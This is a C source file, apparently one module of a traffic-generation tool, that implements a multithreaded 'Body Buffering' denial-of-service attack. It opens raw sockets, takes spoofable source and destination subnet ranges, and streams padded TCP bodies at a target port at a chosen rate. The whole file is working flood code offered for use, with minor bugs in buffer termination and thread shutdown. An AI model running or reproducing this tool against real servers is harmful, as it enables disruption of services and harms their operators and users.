#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/body_buffering.h"

#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
#define BODY_BUFFERING_CNT 2000

extern int g_num_threads;
extern int g_packet_size;

// session counting
uint32_t g_bodybuf_num_total;
uint32_t g_bodybuf_num_generated_in_sec;

// from main()
InputArguments g_bodybuf_input;

// for masking next ip address
MaskingArguments g_bodybuf_now;
uint32_t g_bodybuf_request_per_sec;

// thread
pthread_mutex_t g_bodybuf_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_bodybuf_cond = PTHREAD_COND_INITIALIZER;

// time checking
struct timespec g_bodybuf_before_time;
struct timespec g_bodybuf_now_time;

void BodyBufferingPrintUsage(void)
{
    printf(
            "Body Buffering Usage : "
            "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
    return;
}

void *GenerateBodyBuffering(void *data)
{
    int thread_id = *((int*) data);

    char body_data[g_packet_size];

    int i;
    for(i=0;i<g_packet_size/3;i++){
        body_data[i*3] = 'a';
        body_data[i*3+1] = '\r';
        body_data[i*3+2] = '\n';

    }

    body_data[i] = '\0';
    // make tcp connection
    int sock = MakeRawSocket(IPPROTO_TCP);

    // for data transfer
    int src_port, seq, ack;
    int bodybuf_cnt = 0;

    MaskingArguments bodybuf_now;

    while (1) {
        // *** begin of critical section ***
        pthread_mutex_lock(&g_bodybuf_mutex);

        GetMaskingArguments(&g_bodybuf_input, &g_bodybuf_now);
        bodybuf_now = g_bodybuf_now;

        // wait a second
        if (g_bodybuf_num_generated_in_sec >= g_bodybuf_request_per_sec) {
            pthread_cond_wait(&g_bodybuf_cond, &g_bodybuf_mutex);
        }

        g_bodybuf_num_generated_in_sec++;
        g_bodybuf_num_total++;
        // *** end of critical section ***

        pthread_mutex_unlock(&g_bodybuf_mutex);

        if (bodybuf_cnt % BODY_BUFFERING_CNT == 0) {
            MakeTcpConnection(
                    sock,
                    inet_addr(bodybuf_now.src),
                    inet_addr(bodybuf_now.dest),
                    &src_port,
                    bodybuf_now.port,
                    &seq,
                    &ack,
                    0);
            TcpSocketSendData(
                    sock,
                    inet_addr(bodybuf_now.src),
                    inet_addr(bodybuf_now.dest),
                    src_port,
                    bodybuf_now.port,
                    body_data,
                    g_packet_size,
                    seq, ack, 0);
            seq += g_packet_size;

            bodybuf_cnt = 0;
        }

        TcpSocketSendData(
                sock,
                inet_addr(bodybuf_now.src),
                inet_addr(bodybuf_now.dest),
                src_port,
                bodybuf_now.port,
                body_data,
                g_packet_size,
                seq, ack, 0);

        seq += g_packet_size;
        bodybuf_cnt++;
    }
    close(sock);
    return NULL;
}

void *BodyBufferingTimeCheck(void *data)
{
    while (1) {
        pthread_mutex_lock(&g_bodybuf_mutex);
        TimeCheck(
                &g_bodybuf_cond,
                &g_bodybuf_before_time,
                &g_bodybuf_now_time,
                &g_bodybuf_num_generated_in_sec);
        pthread_mutex_unlock(&g_bodybuf_mutex);
    }
    return NULL;
}

void BodyBufferingMain(char *argv[])
{



    int argc = 0;
    while (argv[argc] != NULL) {
        argc++;
    }
    if (argc != 4) {
        BodyBufferingPrintUsage();
        return;
    }
    ArgvToInputArguments(argv, &g_bodybuf_input);
    g_bodybuf_num_generated_in_sec = 0;
    g_bodybuf_num_total = 0;
    memset(&g_bodybuf_before_time, 0, sizeof(struct timespec));
    memset(&g_bodybuf_now_time, 0, sizeof(struct timespec));
    g_bodybuf_request_per_sec = atoi(argv[3]);


    int i;
    const int num_threads = g_num_threads;
    pthread_t threads[9999];
    int thread_ids[9999];
    for (i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
    }
    printf("Body Buffering attack to %s using %d threads\n",
            g_bodybuf_input.dest,
            num_threads);

    for (i = 0; i < num_threads; i++) {
        pthread_create(
                &threads[i],
                NULL,
                GenerateBodyBuffering,
                (void *)&thread_ids[i]);
    }
    pthread_create(&threads[i], NULL, BodyBufferingTimeCheck, NULL);
    for (i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
        printf("threads %d joined\n", i);
    }
    pthread_mutex_destroy(&g_bodybuf_mutex);
    pthread_exit(NULL);
    printf("Body Buffering finished\nTotal %lu packets sent.\n",
            g_bodybuf_num_total);


    return;
}
